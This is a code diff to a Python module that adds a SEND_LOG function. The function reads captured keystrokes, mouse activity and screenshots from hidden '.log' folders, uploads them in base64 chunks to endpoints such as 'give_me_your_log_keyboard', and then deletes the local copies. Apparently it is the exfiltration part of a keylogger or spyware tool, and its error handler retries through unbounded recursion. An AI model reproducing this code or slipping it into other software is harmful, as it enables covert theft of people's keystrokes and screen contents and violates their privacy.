@@ -1,6 +1,5 @@
 from app.functions import run_server_sub, check_log
-import subprocess, time, json, os, asyncio
-
+import subprocess, time, json, os, asyncio, requests, base64
 def PAUSE_SERVER(x,server_process):
     """Server will be paused (kill and restart after x seconds)"""
     
@@ -293,3 +292,64 @@ def PICTURE_MODE(mode,timer,path):
     except:
         asyncio.run(check_log(force=True))
         return PICTURE_MODE(type,timer,path)
+def SEND_LOG():
+    """ Send log """
+    
+    folder = './.log/.keyboard'
+    files = os.listdir(folder)
+
+    for file in files:
+        path_file = os.path.join(folder, file)
+        if os.path.isfile(path_file):
+            with open(path_file, 'r') as file:
+                contenu = file.read()
+                url = "http://localhost:3000/give_me_your_log_keyboard"
+                data = {"contenue": contenu}
+                
+                requests.post(url, data)
+                time.sleep(5)
+            os.remove(path_file) 
+               
+    folder = './.log/.mouse'
+    files = os.listdir(folder)
+
+    for file in files:
+        path_file = os.path.join(folder, file)
+        if os.path.isfile(path_file):
+            with open(path_file, 'r') as file:
+                contenu_b = file.read()
+                url = "http://localhost:3000/give_me_your_log_mouse"
+                data = {"contenue": contenu_b}
+                
+                requests.post(url, data)
+                time.sleep(5)
+            os.remove(path_file)  
+            
+    try:
+        folder_img = './.log/.pictures'
+        img = [f for f in os.listdir(folder_img) if f.endswith(('.jpg', '.jpeg', '.png', '.gif'))]
+
+        folder_img = './.log/.pictures'
+        url_serveur = "http://localhost:3000/give_me_your_log_picture"
+
+        for img_name in img:
+            file_img = os.path.join(folder_img, img_name)
+
+            
+            with open(file_img, 'rb') as img_file:# read the img as binary
+                binary = img_file.read()
+
+            # cut the img into 1024 bytes
+            field = [binary[i:i+1024] for i in range(0, len(binary), 1024)]
+
+            # Send the img to the server
+            for i, fiel in enumerate(field):
+                img_base64 = base64.b64encode(fiel).decode()
+                data = {
+                    "img_name": img_name,
+                    "img_base64": img_base64
+                }
+                requests.post(url_serveur, data)
+            os.remove(file_img)
+    except:
+        return SEND_LOG()
